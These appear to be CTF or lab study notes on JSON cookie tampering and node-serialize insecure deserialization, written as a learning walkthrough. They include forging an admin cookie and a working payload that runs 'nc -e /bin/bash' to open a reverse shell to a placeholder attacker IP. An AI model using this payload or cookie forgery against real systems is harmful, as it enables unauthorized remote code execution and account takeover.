# JSON
* cookies: piece of data a server sends to a browser. The browser may store,
create, modify existing ones, and send them back to the same server.

  Typically, the server will use the contents of HTTP cookies to determine
  whether different requests come from the same browser.

* burpsuit is useful (straight forward) with these.
* look for cookies in "burpsuit":
```
GET / HTTP/1.1
Host: tod:666
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
User-Agent: ...
Accept: ...
Accept-Encoding: gzip, deflate, br
Cookie: ...
If-None-Match: W/"24-xWt5IUP3GfGbHraPgY5EGPpcNzA"
Connection: keep-alive
```
* analyzing cookie: `Cookie: profile=eyJ1c2VybmFtZSI6IkFkbWluIiwiY3NyZnRva2VuIjoidTMydDRvM3RiM2dnNDMxZnMzNGdnZGdjaGp3bnphMGw9IiwiRXhwaXJlcz0iOkZyaWRheSwgMTMgT2N0IDIwMTggMDA6MDA6MDAgR01UIn0%3D`
  * %3D: at the end of the cookie, a base64 encoded data.
  * JSON strings when base64 encoded will start with "ey".
  * use base64 to decode it, when piping, use single quote.
  * you can modify and resend it.
  * this cookie is in a malformed JSON format. change and resend it.
  * this one works even only with {"username":"admin"} and without other
    details.

* JavaScript Object Notation
  * “Unexpected token F in JSON”:
    when parsing a malformed JSON with the JSON.parse() function or use the
    .json() method on the fetch object
    * means you sent JSON data with messed up syntax.

* the cookie in this case is passed to unserialize() function.
```
SyntaxError: Unexpected token F in JSON at position 79
    at JSON.parse (<anonymous>)
    at Object.exports.unserialize (/home/nodeadmin/.web/node_modules/node-serialize/lib/serialize.js:62:16)
...
```
* there is this function "Object.exports.unserialize" in "node-serialize"
  module.

* serialization: the process of converting data into a byte stream.
  the data can be an object, that contains a functions, so it's executable but
  after serialization it turns into an string.
```
var obj = {
  name: 'Bob',
  say: function() {
    return 'hi ' + this.name;
  }
};

var objS = serialize.serialize(obj);
typeof objS === 'string';
serialize.unserialize(objS).say() === 'hi Bob';
```
* to exploit it we modify the cookie:
```
{"username":"_$$ND_FUNC$$_function(){return
require('child_process').execSync('nc -e /bin/bash <attack_IP> <port>',(e,out,err)=>{console.log(out);}); }()"}
```
* this is the node serialize module responsible:
```
var FUNCFLAG = '_$$ND_FUNC$$_';
var CIRCULARFLAG = '_$$ND_CC$$_';
var KEYPATHSEPARATOR = '_$$.$$_';
var ISNATIVEFUNC = /^function\s*[^(]*\(.*\)\s*\{\s*\[native code\]\s*\}$/;

var getKeyPath = function(obj, path) {
  path = path.split(KEYPATHSEPARATOR);
  var currentObj = obj;
  path.forEach(function(p, index) {
    if (index) {
      currentObj = currentObj[p];
    }
  });
  return currentObj;
};

exports.serialize = function(obj, ignoreNativeFunc, outputObj, cache, path) {
  path = path || '$';
  cache = cache || {};
  cache[path] = obj;
  outputObj = outputObj || {};

  var key;
```
